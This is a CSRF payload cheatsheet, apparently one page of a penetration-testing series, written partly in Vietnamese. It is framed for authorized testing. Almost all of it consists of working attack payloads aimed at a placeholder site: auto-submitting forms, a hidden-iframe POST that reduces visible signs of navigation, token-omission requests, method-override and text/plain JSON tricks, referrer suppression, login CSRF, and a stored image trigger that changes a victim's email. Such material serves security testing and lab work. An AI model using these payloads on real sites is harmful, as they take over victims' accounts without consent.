# CSRF Payloads Cheatsheet

> For authorized security testing, lab building, and defensive validation only.

## Cách dùng cheatsheet

1. Bắt request hợp lệ trước.
2. Thay giá trị endpoint/params theo target lab.
3. Chỉ dùng trong môi trường được phép.
4. Luôn xác nhận state change thực tế thay vì chỉ nhìn status code.

## 1. GET-based payloads

## Link requiring click

```html
<a
  href="https://target.example/account/change-email?email=attacker@example.net"
>
  Click to view content
</a>
```

## Auto-fire bằng image tag

```html
<img
  src="https://target.example/account/change-email?email=attacker@example.net"
  alt=""
/>
```

## 2. POST form payloads

## Form POST cơ bản

```html
<form action="https://target.example/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.net" />
  <input type="submit" value="Submit" />
</form>
```

## Auto-submit POST

```html
<form
  id="csrf"
  action="https://target.example/account/change-email"
  method="POST"
>
  <input type="hidden" name="email" value="attacker@example.net" />
</form>
<script>
  document.getElementById("csrf").submit();
</script>
```

## POST qua iframe để giảm dấu hiệu điều hướng

```html
<iframe name="hiddenFrame" style="display:none"></iframe>
<form
  action="https://target.example/account/change-email"
  method="POST"
  target="hiddenFrame"
>
  <input type="hidden" name="email" value="attacker@example.net" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## 3. Token-bypass test templates

## Omit token parameter

```http
POST /account/change-email HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

email=attacker@example.net
```

## Empty token value

```http
POST /account/change-email HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

email=attacker@example.net&csrf=
```

## 4. Method and request-shape bypass templates

## Method override mẫu

```html
<form action="https://target.example/account/update" method="POST">
  <input type="hidden" name="_method" value="DELETE" />
  <input type="hidden" name="user" value="victim" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## JSON-like body qua text/plain form trick

```html
<form
  action="https://target.example/api/profile"
  method="POST"
  enctype="text/plain"
>
  <input name='{"email":"attacker@example.net","pad":"' value='"}' />
</form>
<script>
  document.forms[0].submit();
</script>
```

## 5. Referer/Origin validation probing helpers

## Suppress referer (để test fail-open)

```html
<meta name="referrer" content="never" />
<form action="https://target.example/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.net" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## 6. Login CSRF skeleton

```html
<form action="https://target.example/login" method="POST">
  <input type="hidden" name="username" value="attacker_account" />
  <input type="hidden" name="password" value="attacker_password" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## 7. Stored CSRF primitive

```html
<img
  src="https://target.example/account/change-email?email=attacker@example.net"
  alt=""
/>
```

Khi payload này được lưu vào nội dung user-generated có render HTML, mọi nạn nhân xem nội dung đều có thể kích hoạt request.

## Burp-based workflow nhanh

1. Chọn request nhạy cảm trong proxy history.
2. Generate CSRF PoC.
3. Tinh chỉnh payload theo bypass hypothesis.
4. Test bằng browser đã đăng nhập.

## Related Files

- [Exploitation Workflow](04-exploitation-workflow.md)
- [Token Validation Bypasses](05-token-validation-bypasses.md)
- [Origin Referer and Request Shape Bypass](07-origin-referer-and-request-shape-bypass.md)
- [Advanced CSRF Patterns](08-advanced-csrf-patterns.md)
- [Testing Checklist and Playbook](12-testing-checklist-and-playbook.md)
